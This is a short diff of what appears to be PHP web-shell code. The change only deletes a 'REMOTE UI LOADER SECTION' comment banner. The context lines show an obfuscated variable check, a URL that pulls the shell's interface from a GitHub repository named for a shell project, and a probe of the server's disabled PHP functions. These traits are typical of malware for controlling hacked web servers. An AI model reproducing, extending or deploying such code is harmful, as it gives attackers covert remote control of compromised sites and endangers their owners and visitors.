@@ -764,9 +764,6 @@ if ($_a13b6a78) {
     }
 }
 
-// ==================================================================================
-// REMOTE UI LOADER SECTION
-// ==================================================================================
 $remote_ui_url = "https://raw.githubusercontent.com/z3r0-team/IndonesianPeople5h3llz-Project/refs/heads/main/html-css-js.txt";
 $ui_content = false;
 $disable_functions = array_map('trim', explode(',', ini_get('disable_functions')));
